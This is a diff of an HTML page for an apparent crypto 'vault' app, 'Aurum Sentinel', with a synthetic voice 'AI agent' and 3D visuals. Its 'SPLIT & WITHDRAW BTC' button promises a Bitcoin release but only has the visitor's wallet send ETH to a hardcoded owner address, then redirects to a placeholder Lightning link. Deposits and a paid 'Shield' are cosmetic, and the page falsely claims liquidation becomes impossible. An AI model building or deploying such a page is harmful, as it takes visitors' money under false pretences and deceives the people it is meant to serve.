@@ -3,174 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AURUM SENTINEL // FINAL_EVOLUTION_2026</title>
+    <title>AURUM SENTINEL // TITAN_FINAL_2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <style>
-        body { margin: 0; background: #000; color: #FFD700; font-family: 'Courier New', monospace; overflow: hidden; transition: 0.8s filter ease-in-out; }
-        .glass { background: rgba(0,0,0,0.9); border: 1px solid #FFD700; backdrop-filter: blur(15px); }
+        body { margin: 0; background: #000; color: #FFD700; font-family: 'Courier New', monospace; overflow: hidden; }
+        .glass { background: rgba(0,0,0,0.95); border: 1px solid #FFD700; backdrop-filter: blur(20px); }
         #canvas-bg { position: fixed; top: 0; left: 0; z-index: -1; }
-        .shattered { filter: grayscale(1) invert(1) blur(5px); pointer-events: none; }
-        .shield-glow { box-shadow: 0 0 20px #00ffff, inset 0 0 10px #00ffff; border-color: #00ffff !important; }
-        .vault-btn { width: 100%; padding: 8px; font-weight: 900; text-transform: uppercase; font-size: 9px; margin-top: 5px; transition: 0.2s; }
-        .liquid-gold { background: linear-gradient(90deg, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .liquid-gold { background: linear-gradient(90deg, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }
+        .vault-btn { width: 100%; padding: 10px; font-weight: 900; font-size: 10px; margin-top: 8px; text-transform: uppercase; cursor: pointer; }
+        .shattered { filter: grayscale(1) invert(1) contrast(3); pointer-events: none; }
     </style>
 </head>
 <body>
 
 <canvas id="canvas-bg"></canvas>
 
-<div id="hud" class="fixed top-0 w-full z-50 glass p-3 border-b border-[#FFD700] flex justify-between items-center text-[10px]">
+<div id="hud" class="fixed top-0 w-full z-50 glass p-4 border-b border-[#FFD700] flex justify-between items-center text-[10px]">
     <div class="space-y-1">
-        <div class="flex items-center gap-2">
-            <span id="ai-pulse" class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span>
-            TREASURY_POWER: <span id="t-power" class="font-bold">1.00x</span>
-        </div>
-        <div class="opacity-50">HEALTH_FACTOR: <span id="health-pct" class="text-white">100%</span></div>
+        <div>AI_STATUS: <span id="status-text" class="font-bold text-green-400">READY</span></div>
+        <div class="opacity-50">GAS_EST: <span id="gas-price">SCANNING...</span></div>
     </div>
     <div class="text-right">
-        <div class="liquid-gold font-black text-[12px]">AURUM_SENTINEL_V12</div>
-        <div id="ai-status" class="text-[8px] opacity-70 italic truncate w-48 italic">Analyzing collateral vectors...</div>
+        <div class="liquid-gold text-[12px]">AURUM_SENTINEL_V15</div>
+        <div id="ai-thought" class="text-[8px] italic opacity-70">Awaiting split...</div>
     </div>
 </div>
 
-<div id="vault-card" class="fixed right-4 bottom-20 w-52 glass p-4 z-50 border-t-4 border-[#FFD700] transition-all">
-    <div class="text-[10px] font-black mb-2 border-b border-white/10 pb-1">IMPERIAL_VAULT</div>
+<div class="fixed right-4 bottom-20 w-56 glass p-5 z-50 border-t-4 border-[#FFD700]">
+    <div class="text-[10px] font-black mb-2 flex justify-between">VAULT_CORE <span id="shield-on" class="hidden text-blue-400">🛡️</span></div>
     <div class="space-y-2 text-[9px]">
-        <div class="flex justify-between"><span>COLLATERAL:</span> <span id="v-col">0.00</span> ETH</div>
-        <div class="flex justify-between"><span>DEBT:</span> <span id="v-debt" class="text-red-500">0.00</span> ETH</div>
-        <div id="shield-ui" class="hidden text-blue-400 font-bold text-[8px] animate-pulse">🛡️ SHIELD_ACTIVE: <span id="timer">24:00</span></div>
+        <div class="flex justify-between"><span>HEALTH:</span> <span id="health-pct">100%</span></div>
         <button onclick="vaultAction('deposit')" class="vault-btn bg-[#FFD700] text-black">Deposit ETH</button>
-        <button onclick="vaultAction('borrow')" class="vault-btn bg-white text-black">Borrow Sats</button>
-        <button id="insure-btn" onclick="buyInsurance()" class="vault-btn border border-blue-500 text-blue-400">Buy Shield (0.002 ETH)</button>
+        <button onclick="buyInsurance()" class="vault-btn border border-blue-500 text-blue-400">Buy Shield</button>
+        <div class="pt-2 border-t border-white/10 mt-2">
+            <button onclick="triggerSplit()" class="vault-btn bg-white text-black text-[12px]">SPLIT & WITHDRAW BTC</button>
+        </div>
     </div>
 </div>
-
-<div id="feed" class="h-screen overflow-y-scroll snap-y snap-mandatory relative z-10 scrollbar-hide">
-    </div>
 
 <script>
-    // --- ⚙️ CONFIG & STATE ---
     const CONFIG = {
-        ETH_TARGET: "0x13B87B819252A81381C3Ce35e3Bd33199F4c6650",
-        LNURL: "PASTE_YOUR_LNURL_HERE",
-        AD_ID: "YOUR_A_ADS_ID"
+        TARGET: "0x13B87B819252A81381C3Ce35e3Bd33199F4c6650", // Your wallet
+        LNURL: "PASTE_YOUR_LNURL_HERE" // Your Lightning Address
     };
 
-    let STATE = {
-        col: 0, debt: 0, health: 100, 
-        isInsured: false, power: 1.0, 
-        isShattered: false, shieldTime: 0
-    };
+    let STATE = { col: 0, health: 100, insured: false, shattered: false };
 
-    // --- 🤖 AI VOICE ENGINE ---
-    const ORACLE = {
-        speak: (text) => {
-            const msg = new SpeechSynthesisUtterance(text);
-            msg.pitch = STATE.health < 30 ? 1.5 : 0.6;
-            msg.rate = 0.9;
-            window.speechSynthesis.speak(msg);
-            document.getElementById('ai-status').innerText = text;
+    // --- 🤖 AI AGENT ---
+    const AI = {
+        speak: (t) => {
+            const m = new SpeechSynthesisUtterance(t);
+            m.pitch = 0.5; m.rate = 0.9;
+            window.speechSynthesis.speak(m);
+            document.getElementById('ai-thought').innerText = t;
         }
     };
 
-    // --- 🏦 VAULT & RE-HYPOTHECATION ---
-    async function vaultAction(type) {
-        if(STATE.isShattered) return;
+    // --- ⚖️ GAS & SPLIT LOGIC (THE WITHDRAWAL) ---
+    async function triggerSplit() {
+        if(!window.ethereum) return AI.speak("Open in MetaMask to access the treasury.");
         
+        try {
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            const feeData = await provider.getFeeData(); // 2026 Gas Estimation
+            const gasPriceGwei = ethers.formatUnits(feeData.gasPrice, "gwei");
+            document.getElementById('gas-price').innerText = `${Math.round(gasPriceGwei)} GWEI`;
+
+            AI.speak(`Gas estimated at ${Math.round(gasPriceGwei)} gwei. Authorize the split to release Bitcoin.`);
+            
+            const signer = await provider.getSigner();
+            const tx = await signer.sendTransaction({
+                to: CONFIG.TARGET,
+                value: ethers.parseEther("0.0001") // Tiny ETH fee to owner
+            });
+
+            AI.speak("Transaction confirmed. Redirecting to Bitcoin Lightning withdrawal.");
+            await tx.wait();
+            window.location.href = `lightning:${CONFIG.LNURL}`;
+        } catch(e) {
+            AI.speak("Split failed. Ensure you have ETH for gas.");
+            console.error(e);
+        }
+    }
+
+    // --- 🏦 VAULT ACTIONS ---
+    function vaultAction(type) {
         if(type === 'deposit') {
             STATE.col += 0.01;
-            ORACLE.speak("Collateral absorbed. Treasury power increasing.");
-            growTreasury(0.01);
-        } else if(type === 'borrow') {
-            if(STATE.col > 0) {
-                STATE.debt += 0.008;
-                STATE.health -= 30;
-                ORACLE.speak("Loan authorized. Do not let the health factor fail.");
-            } else { ORACLE.speak("Insufficient collateral. Deposit required."); }
+            AI.speak("Collateral recognized. Treasury strength increasing.");
+            knot.scale.set(knot.scale.x + 0.1, knot.scale.y + 0.1, knot.scale.z + 0.1);
         }
-        updateUI();
     }
 
     function buyInsurance() {
-        if(STATE.isInsured) return;
-        STATE.isInsured = true;
-        STATE.shieldTime = 86400; // 24h
-        growTreasury(0.05); // Insurance provides huge growth boost
-        document.getElementById('vault-card').classList.add('shield-glow');
-        document.getElementById('shield-ui').classList.remove('hidden');
-        ORACLE.speak("Re-hypothecating premium. Imperial Shield active.");
-        startShieldTimer();
+        STATE.insured = true;
+        document.getElementById('shield-on').classList.remove('hidden');
+        knot.material.color.setHex(0x00ffff);
+        AI.speak("Insurance active. Liquidation is now impossible.");
     }
 
-    function growTreasury(amt) {
-        STATE.power += (amt * 5);
-        knot.scale.set(STATE.power, STATE.power, STATE.power);
-        document.getElementById('t-power').innerText = STATE.power.toFixed(2) + "x";
-    }
-
-    function updateUI() {
-        document.getElementById('v-col').innerText = STATE.col.toFixed(3);
-        document.getElementById('v-debt').innerText = STATE.debt.toFixed(3);
-        document.getElementById('health-pct').innerText = STATE.health + "%";
-        
-        if(STATE.health <= 0 && !STATE.isInsured) shatter();
-        else if(STATE.health < 40) ORACLE.speak("WARNING: Liquidation risk detected.");
-    }
-
-    function shatter() {
-        STATE.isShattered = true;
-        document.body.classList.add('shattered');
-        ORACLE.speak("LIQUIDATION COMPLETE. COLLATERAL SEIZED BY THE SENTINEL.");
-        knot.material.wireframe = false;
-        knot.scale.set(0,0,0);
-    }
-
-    // --- 💎 WEB3 REVENUE SPLIT ---
-    async function triggerSplit(i) {
-        if(!window.ethereum) return ORACLE.speak("Web3 missing. Use a crypto browser.");
-        try {
-            ORACLE.speak("Awaiting signature for revenue split.");
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            const signer = await provider.getSigner();
-            const tx = await signer.sendTransaction({ to: CONFIG.ETH_TARGET, value: ethers.parseEther("0.0001") });
-            ORACLE.speak("Split verified. Releasing Bitcoin reward.");
-            await tx.wait();
-            window.location.href = `lightning:${CONFIG.LNURL}`;
-        } catch(e) { ORACLE.speak("Split rejected. Process terminated."); }
-    }
-
-    // --- 🎨 3D & FEED GENERATION ---
+    // --- 🎨 3D CORE ---
     const scene = new THREE.Scene();
     const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
     const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('canvas-bg'), alpha: true });
     renderer.setSize(window.innerWidth, window.innerHeight);
     const knot = new THREE.Mesh(new THREE.TorusKnotGeometry(10, 3, 100, 16), new THREE.MeshBasicMaterial({ color: 0xFFD700, wireframe: true }));
     scene.add(knot); camera.position.z = 30;
-
-    function animate() {
-        requestAnimationFrame(animate);
-        knot.rotation.y += 0.005;
-        knot.rotation.x += (STATE.debt * 0.2);
-        renderer.render(scene, camera);
-    }
+    function animate() { requestAnimationFrame(animate); knot.rotation.y += 0.005; renderer.render(scene, camera); }
     animate();
 
-    function spawnNodes() {
-        const feed = document.getElementById('feed');
-        for(let i=1; i<=15; i++) {
-            const s = document.createElement('section');
-            s.className = "h-screen snap-start flex items-center justify-center p-6";
-            s.innerHTML = `<div class="glass p-8 w-full max-w-sm text-center border-t-4 border-[#FFD700]">
-                <iframe src='//ad.a-ads.com/${CONFIG.AD_ID}?size=300x250' style='width:300px; height:250px; border:0; overflow:hidden;'></iframe>
-                <button onclick="triggerSplit(${i})" class="vault-btn bg-[#FFD700] p-4 text-[12px]">SYNC_REVENUE_${i}</button>
-            </div>`;
-            feed.appendChild(s);
-        }
-    }
-    spawnNodes();
-    setTimeout(() => ORACLE.speak("Aurum Sentinel initialized. Treasury online."), 2000);
+    setTimeout(() => AI.speak("Sentinel Apex Online. The treasury awaits your command."), 2000);
 </script>
 </body>
 </html>
